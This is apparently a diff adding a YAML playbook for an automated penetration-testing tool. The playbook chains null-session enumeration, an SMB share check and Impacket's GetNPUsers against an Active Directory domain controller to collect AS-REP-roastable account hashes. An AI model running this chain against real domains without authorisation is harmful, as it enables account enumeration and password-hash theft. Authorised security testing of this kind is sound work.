@@ -1,0 +1,46 @@
+name: "AD Attack — Unauthenticated Enum"
+description: "Active Directory branch two: enumerate the domain controller without credentials — null-session SMB shares, RID cycling, and AS-REP-roastable accounts. The safe first look that needs no password."
+category: ad
+attack_vector: "Null-session enumeration → AS-REP roasting"
+variables:
+  target:
+    required: true
+    description: "Domain controller IP (e.g. 10.0.0.1)"
+  domain:
+    required: true
+    description: "AD domain (e.g. corp.local)"
+cutting_edge: false
+references: ["MITRE ATT&CK T1087", "enum4linux-ng documentation"]
+
+steps:
+  - name: enum4linux
+    tool: enum4linux_enum
+    description: "Null-session enumeration: users, shares, policy, RIDs"
+    args:
+      target: "{{target}}"
+    expected_output: "user|share|Domain|error"
+    timeout: 600
+    gate: false
+    retries: 1
+
+  - name: null_smb
+    tool: crackmapexec_exec
+    description: "Null-session SMB check for share exposure"
+    args:
+      target: "{{target}}"
+      protocol: "smb"
+    expected_output: "SMB|share|error|refused"
+    timeout: 300
+    gate: false
+    retries: 1
+
+  - name: asrep_check
+    tool: impacket_tools
+    description: "Hunt AS-REP-roastable accounts via Impacket (GetNPUsers)"
+    args:
+      tool: "GetNPUsers.py"
+      target: "{{domain}}/"
+    expected_output: "krb5asrep|hash|no preauth|none found|does not require"
+    timeout: 300
+    gate: true
+    retries: 1
